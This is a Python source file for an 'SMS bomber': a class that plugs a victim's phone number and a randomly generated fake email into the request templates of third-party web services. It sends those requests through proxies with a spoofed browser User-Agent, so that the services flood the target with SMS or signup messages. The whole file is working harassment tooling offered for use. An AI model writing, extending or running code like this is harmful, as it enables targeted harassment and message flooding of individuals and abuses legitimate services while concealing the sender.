import random
import requests

class smsBomber:
    def __init__(self, cc, number, proxy, serv):
        self.cc = cc
        self.number = number
        self.proxy = proxy
        self.serv = serv
        self.headers = self._headers()
        self.email = self._email()

        pass

    def _headers(self):
        tmp_headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Accept-Encoding': 'none',
            'Accept-Language': 'en-US,en;q=0.8', 'Connection': 'keep-alive'
        }
        if 'headers' in self.serv:
            tmp_headers.update(self.serv['headers'])
        return tmp_headers

    def _email(self):
        tmp_email = '@mail.ru'
        for x in range(12):
            tmp_email = random.choice(list('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')) + tmp_email
        return tmp_email

    def _data(self):
        tmp_data = {}
        kk = 'params'
        if 'json' in self.serv:
            kk = 'json'
        for key, value in self.serv[kk].items():
            if isinstance(value, str):
                tmp_data[key] = value.format(cc=self.cc, target=self.number, ccc='8', email=self.email, semail=self.email.split('@')[0])
        return tmp_data

    def _url(self):
        return self.serv['url'].format(cc=self.cc, target=self.number, ccc='8', email=self.email, semail=self.email.split('@')[0])

    def iter(self):

        method = self.serv['method']
        name = self.serv['name']
        params = self._data()
        headers = self._headers()
        proxy = self.proxy

        try:

            if method == 'GET':
                r = requests.get(self.serv['url'],
                                 params=params,
                                 headers=headers,
                                 timeout=30,
                                 proxies=proxy,
                                 verify=True)

            elif method == 'POST':
                if 'json' in self.serv:
                    r = requests.post(self.serv['url'],
                                      json=params,
                                      headers=headers,
                                      timeout=10,
                                      proxies=proxy,
                                      verify=True)
                elif 'params' in self.serv:
                    r = requests.post(self.serv['url'],
                                      data=params,
                                      headers=headers,
                                      timeout=10,
                                      proxies=proxy,
                                      verify=True)
            if self.serv['identifier'] in r.text:
                print('sending ' + name + '...')
                return 'Suc#' + r.text
            else:
                print('sending ' + name + '...')
                return 'error#' + r.text
        except Exception as ex:
            print('sending ' + name + '...')
            return 'Error#' + str(ex)

